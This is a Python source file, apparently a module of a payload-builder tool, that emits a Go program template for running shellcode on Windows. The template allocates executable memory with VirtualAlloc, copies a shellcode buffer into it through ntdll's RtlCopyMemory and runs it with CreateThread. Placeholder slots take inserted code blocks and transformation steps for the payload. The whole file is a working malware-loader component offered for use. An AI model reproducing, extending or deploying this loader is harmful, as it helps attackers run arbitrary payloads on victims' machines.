class shellcoderunner:

    def imports(self) -> list[str]:
        return ['"unsafe"',
                '"golang.org/x/sys/windows"']

    def compilerOptions(self) -> list[str]:
        return ["golang.org/x/sys/windows"]

    def template(self) -> str:
        return """
package main
    
import (
{imports}
)

{codeblocks}

func main() {{

    
    {transformers}

	addr, _ := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	CreateThread := kernel32.NewProc("CreateThread")
	thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)

	windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
}}
"""